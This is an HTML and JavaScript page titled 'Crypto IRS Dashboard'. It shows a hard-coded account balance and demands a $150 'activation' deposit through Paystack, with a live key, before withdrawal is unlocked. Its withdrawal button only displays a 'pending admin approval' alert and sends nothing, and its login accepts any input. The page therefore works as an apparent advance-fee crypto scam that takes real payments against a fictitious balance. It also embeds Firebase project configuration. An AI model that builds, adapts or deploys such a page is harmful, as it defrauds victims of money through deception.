<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto IRS Dashboard</title>

<style>
body{
margin:0;
font-family:Arial;
background:#0f172a;
color:white;
}

.header{
background:#1e293b;
padding:15px;
display:flex;
justify-content:space-between;
align-items:center;
position:fixed;
top:0;
left:0;
right:0;
}

.menu{cursor:pointer;font-size:22px}

.sidebar{
position:fixed;
left:-260px;
top:0;
width:250px;
height:100%;
background:#1e293b;
padding-top:70px;
transition:.3s;
}

.sidebar.active{left:0}

.sidebar a{
display:block;
padding:15px;
color:white;
text-decoration:none;
}

.sidebar a:hover{background:#00d084}

.main{padding:80px 20px}

.page{display:none}
.page.active{display:block}

.card{
background:#1e293b;
padding:20px;
margin:10px 0;
border-radius:10px;
}

.btn{
background:#00d084;
padding:12px;
border:none;
color:white;
border-radius:10px;
cursor:pointer;
margin-top:10px;
width:100%;
}

input{
width:100%;
padding:12px;
margin:10px 0;
border-radius:10px;
border:none;
}

.popup{
position:fixed;
inset:0;
background:rgba(0,0,0,.8);
display:flex;
justify-content:center;
align-items:center;
}

.popup-box{
background:#1e293b;
padding:20px;
border-radius:10px;
width:90%;
max-width:350px;
}
</style>
</head>

<body>

<div class="header">
<div class="menu" onclick="toggle()">☰</div>
<h3>Crypto IRS</h3>
<div onclick="showPage('profile')">👤</div>
</div>

<div class="sidebar" id="sidebar">
<a href="#" onclick="showPage('dashboard')">Dashboard</a>
<a href="#" onclick="showPage('deposit')">Deposit</a>
<a href="#" onclick="showPage('withdraw')">Withdrawal</a>
<a href="#" onclick="logout()">Logout</a>
</div>

<div class="main">

<!-- DASHBOARD -->
<div id="dashboard" class="page active">
<div class="card">
<h2>Total Balance</h2>
<h1>$1,459.00</h1>
<p id="status">Not Activated</p>
</div>

<div class="card">
<h3>BTC: 0.016</h3>
<h3>ETH: 0.00</h3>
<h3>USDT: 0.00</h3>
</div>

<button class="btn" onclick="showPage('deposit')">Deposit $150 Activation</button>
<button class="btn" onclick="checkAccess()">Check Withdrawal Access</button>
</div>

<!-- DEPOSIT -->
<div id="deposit" class="page">
<h2>Activate Account</h2>
<input id="amount" value="150" disabled>
<button class="btn" onclick="pay()">Pay with Paystack</button>
<button class="btn" onclick="back()">Back</button>
</div>

<!-- WITHDRAW -->
<div id="withdraw" class="page">
<h2>Withdrawal Request</h2>

<input placeholder="Wallet Address">
<input placeholder="Amount">

<button class="btn" id="withdrawBtn" onclick="requestWithdraw()">Request Withdrawal</button>
<button class="btn" onclick="back()">Back</button>
</div>

<!-- PROFILE -->
<div id="profile" class="page">
<h2>Profile</h2>
<p>Email: Irs@user.com</p>
<p>Status: <span id="accStatus">InActive</span></p>
<button class="btn" onclick="back()">Back</button>
</div>

</div>

<!-- LOGIN POPUP -->
<div class="popup" id="loginPopup">
<div class="popup-box">
<h3>Login</h3>
<input placeholder="Email">
<input placeholder="Password">
<button class="btn" onclick="login()">Login</button>
</div>
</div>

<script src="https://js.paystack.co/v1/inline.js"></script>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey:"AIzaSyDB5ydpKUhi3-PhyoN0v5lx3USq3G22gy0",
authDomain:"crypto-irs.firebaseapp.com",
projectId:"crypto-irs",
storageBucket:"crypto-irs.appspot.com",
messagingSenderId:"942940547701",
appId:"1:942940547701:web:098cee1ab5820c4350663c"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let user = "demoUser";

window.pay = function(){

let handler = PaystackPop.setup({
key:"pk_live_725e9c0357625ec847ec27b37e4d1033ac90a718",
email:"irs@user.com",
amount:150*100,

callback: async function(res){

await setDoc(doc(db,"users",user),{
activated:true,
payment:true
});

alert("Activated Successfully");
location.reload();
}

});

handler.openIframe();
}

window.checkAccess = async function(){

const ref = doc(db,"users",user);
const snap = await getDoc(ref);

if(snap.exists() && snap.data().activated){
document.getElementById("withdrawBtn").disabled = false;
document.getElementById("status").innerText="Activated";
document.getElementById("accStatus").innerText="Active";
alert("Access Granted");
}else{
document.getElementById("withdrawBtn").disabled = true;
alert("Pay $150 to activate");
}

}

window.requestWithdraw = function(){
alert("Withdrawal request sent (pending admin approval)");
}

window.login = function(){
document.getElementById("loginPopup").style.display="none";
}

window.toggle = function(){
document.getElementById("sidebar").classList.toggle("active");
}

window.showPage = function(id){
document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
document.getElementById(id).classList.add("active");
document.getElementById("sidebar").classList.remove("active");
}

window.back = function(){
history.back();
}
</script>

</body>
</html>
